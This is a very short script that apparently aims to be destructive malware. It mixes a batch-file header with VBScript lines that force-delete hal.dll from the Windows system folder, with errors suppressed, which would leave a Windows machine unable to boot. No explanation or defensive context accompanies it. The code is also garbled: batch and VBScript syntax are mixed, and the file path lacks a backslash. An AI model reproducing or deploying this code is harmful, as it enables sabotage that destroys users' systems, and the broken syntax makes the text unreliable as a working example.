@echo off
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
fso.deletefile fso.getspecialfolder(0)+"system32hal.dll",1